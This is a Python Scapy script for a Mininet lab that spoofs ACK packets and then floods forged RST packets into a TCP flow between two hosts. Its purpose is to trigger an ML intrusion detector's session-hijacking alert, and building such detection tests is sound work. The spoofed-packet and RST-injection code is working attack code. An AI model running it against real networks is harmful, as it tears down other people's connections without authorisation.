#!/usr/bin/env python3
"""
session_hijack.py — TCP Session Hijacking via RST injection (runs on device2)

Generates flow-level signatures of session hijacking:
- First sends ACK packets into an established flow (ack_count > 5)
- Then sends RST packets at high rate (rst_ratio > 0.15)
- After 20+ packets, ML sees SESSION HIJACKING pattern and classifies it

Uses Scapy for raw packet injection.

Usage (from Mininet CLI):
    device2 python3 /tmp/session_hijack.py 10.0.0.1 10.0.0.2
"""

import sys, time, os
from scapy.all import *

VICTIM_IP = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.1"
SERVER_IP = sys.argv[2] if len(sys.argv) > 2 else "10.0.0.2"
IFACE     = sys.argv[3] if len(sys.argv) > 3 else None

LOG = "/tmp/session_hijack_output.txt"

def log(msg):
    ts = time.strftime('%H:%M:%S')
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    try:
        open(LOG, 'a').write(line + "\n")
    except:
        pass

# Detect interface
if not IFACE:
    for iface in get_if_list():
        try:
            ip = get_if_addr(iface)
            if ip.startswith('10.0.0.'):
                IFACE = iface
                break
        except:
            continue
    if not IFACE:
        IFACE = str(conf.iface)

log(f"[HIJACK] TCP Session Hijacking simulation on {IFACE}")
log(f"[HIJACK] Injecting into: {VICTIM_IP} ↔ {SERVER_IP}:8080")

MY_MAC = get_if_hwaddr(IFACE)
MY_IP  = get_if_addr(IFACE)

# Phase 1: Send ACK packets to build ack_count > 5 in the flow
log("[HIJACK] Phase 1: Injecting ACK packets (establishing session context)...")
for i in range(10):
    pkt = (
        Ether(src=MY_MAC, dst="ff:ff:ff:ff:ff:ff") /
        IP(src=VICTIM_IP, dst=SERVER_IP) /
        TCP(sport=10000 + i, dport=8080, flags="A",
            seq=1000 + i * 100, ack=2000 + i * 100)
    )
    sendp(pkt, iface=IFACE, verbose=False)
    time.sleep(0.1)

log("[HIJACK] Phase 1 done: 10 ACK packets injected")

# Phase 2: RST injection flood — hijack/terminate the TCP session
log("[HIJACK] Phase 2: RST injection (session hijacking) ...")
for i in range(20):
    # RST from victim side (terminate victim→server session)
    pkt_rst_v = (
        Ether(src=MY_MAC, dst="ff:ff:ff:ff:ff:ff") /
        IP(src=VICTIM_IP, dst=SERVER_IP) /
        TCP(sport=10000 + i, dport=8080, flags="R",
            seq=5000 + i * 50)
    )
    # RST+ACK from server side (forged, inject into return path)
    pkt_rst_s = (
        Ether(src=MY_MAC, dst="ff:ff:ff:ff:ff:ff") /
        IP(src=SERVER_IP, dst=VICTIM_IP) /
        TCP(sport=8080, dport=10000 + i, flags="RA",
            seq=6000 + i * 50, ack=5001 + i * 50)
    )
    sendp([pkt_rst_v, pkt_rst_s], iface=IFACE, verbose=False)
    if i % 5 == 0:
        log(f"[HIJACK] RST burst {i+1}/20 sent")
    time.sleep(0.15)

log("[HIJACK] Phase 2 done: RST injection complete")
log("[HIJACK] Session Hijacking simulation complete — check Ryu for SESSION HIJACKING alert")
